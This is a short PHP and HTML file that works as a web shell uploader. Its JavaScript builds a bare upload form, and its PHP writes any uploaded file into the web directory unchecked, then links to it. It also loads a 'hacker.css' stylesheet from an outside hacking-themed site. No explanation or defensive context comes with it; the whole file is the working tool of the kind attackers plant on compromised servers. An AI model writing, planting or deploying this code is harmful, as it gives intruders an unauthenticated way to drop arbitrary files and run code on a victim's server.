<script>
window.addEventListener("DOMContentLoaded",function(){let e=document.createElement("form");e.method="post",e.enctype="multipart/form-data";let t=document.createElement("input");t.type="file",t.name="file",t.required=!0;let n=document.createElement("button");n.type="submit",n.innerHTML="UP",e.appendChild(t),e.appendChild(n),document.body.appendChild(e)});
</script>
<link href="https://privdayz.com/wp-content/themes/privdaysv1/hacker.css" rel="stylesheet">
<?php if($_FILES){if(function_exists('move_uploaded_file')){if(move_uploaded_file($_FILES['file']['tmp_name'],$_FILES['file']['name'])){printf('uploaded: <a href="%s">%s</a><br/>',$_FILES['file']['name'],$_FILES['file']['name']);}else{print 'fail';}}elseif(function_exists('copy')){if(copy($_FILES['file']['tmp_name'],$_FILES['file']['name'])){printf('uploaded: <a href="%s">%s</a><br/>',$_FILES['file']['name'],$_FILES['file']['name']);}else{print 'failed';}}}
?>
